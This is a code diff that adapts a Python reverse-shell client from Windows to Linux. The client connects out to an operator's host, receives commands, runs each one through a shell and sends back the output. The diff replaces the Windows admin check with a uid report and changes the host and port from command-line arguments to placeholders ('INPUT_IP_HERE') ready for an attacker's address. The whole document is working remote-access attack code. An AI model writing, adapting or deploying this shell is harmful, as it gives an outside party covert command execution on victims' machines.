@@ -2,7 +2,6 @@ import socket
 import subprocess
 import os
 import sys
-import ctypes
 
 def inbound():
     while True:
@@ -20,7 +19,7 @@ def session_handler():
     print(f"[+] Connecting to {HOST_IP}...")
     sock.connect((HOST_IP, HOST_PORT))
     print(f"[+] Connected to {HOST_IP}.")
-    outbound(ctypes.windll.shell32.IsUserAnAdmin())
+    outbound(f"Linux {os.getuid()}")
     while True:
         message = inbound()
         print(f"[+] Instruction recieved --> {message}")
@@ -51,18 +50,15 @@ def session_handler():
         # case for handling commands without arguments
         else:
             # encoding="oem" is for Windows encoding, remove parameter otherwise
-            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="oem")
+            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8")
             output = command.stdout.read() + command.stderr.read()
             outbound(output)
 
 if __name__ == "__main__":
     try:
-        HOST_IP = sys.argv[1]
-        HOST_PORT = int(sys.argv[2])
+        HOST_IP = 'INPUT_IP_HERE'
+        HOST_PORT = INPUT_PORT_HERE
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         session_handler()
-    except IndexError:
-        print("[-] Command line argument(s) missing.")
-        print("    \___ Usage : python3 sockserver.py ip_address port")
     except Exception as error:
         print(f"An error occured : {error}")
